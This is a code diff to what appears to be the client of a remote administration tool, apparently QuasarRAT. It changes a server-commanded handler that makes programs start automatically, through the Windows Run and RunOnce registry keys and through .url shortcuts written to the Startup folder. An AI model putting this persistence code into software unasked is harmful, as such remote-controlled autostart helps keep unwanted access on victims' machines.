@@ -198,16 +198,51 @@ namespace xClient.Core.Commands
                         }
                         break;
                     case 4:
-                        if (
-                            !Directory.Exists(
-                                Path.Combine(
-                                    Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
-                                    "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
-                            throw new Exception();
+                        if (OSInfo.Bits != 64)
+                            throw new Exception("Only on 64-bit systems supported");
 
-                        string lnkPath =
-                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
-                                "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + command.Name + ".url");
+                        using (
+                            var key =
+                                Registry.LocalMachine.OpenSubKey(
+                                    "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+                        {
+                            if (key == null) throw new Exception();
+                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
+                                command.Path = "\"" + command.Path + "\"";
+                            key.SetValue(command.Name, command.Path);
+                        }
+                        break;
+                    case 5:
+                        if (OSInfo.Bits != 64)
+                            throw new Exception("Only on 64-bit systems supported");
+
+                        using (
+                            var key =
+                                Registry.LocalMachine.OpenSubKey(
+                                    "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
+                        {
+                            if (key == null) throw new Exception();
+                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
+                                command.Path = "\"" + command.Path + "\"";
+                            key.SetValue(command.Name, command.Path);
+                        }
+                        break;
+                    case 6:
+                        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
+                        {
+                            try
+                            {
+                                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
+                            }
+                            catch (Exception ex)
+                            {
+                                new Packets.ClientPackets.Status(string.Format("Adding Autostart Item failed: {0}", ex.Message)).Execute(client);
+                                return;
+                            }
+                        }
+
+                        string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),
+                            command.Name + ".url");
 
                         using (var writer = new StreamWriter(lnkPath, false))
                         {
@@ -218,31 +253,11 @@ namespace xClient.Core.Commands
                             writer.Flush();
                         }
                         break;
-                    case 5:
-                        if (
-                            !Directory.Exists(
-                                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                                    "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
-                            throw new Exception();
-
-                        string lnkPath2 =
-                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                                "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + command.Name + ".url");
-
-                        using (var writer = new StreamWriter(lnkPath2, false))
-                        {
-                            writer.WriteLine("[InternetShortcut]");
-                            writer.WriteLine("URL=file:///" + command.Path);
-                            writer.WriteLine("IconIndex=0");
-                            writer.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
-                            writer.Flush();
-                        }
-                        break;
                 }
             }
-            catch
+            catch (Exception ex)
             {
-                new Packets.ClientPackets.Status("Adding Autostart Item failed!").Execute(client);
+                new Packets.ClientPackets.Status(string.Format("Adding Autostart Item failed: {0}", ex.Message)).Execute(client);
             }
         }
 
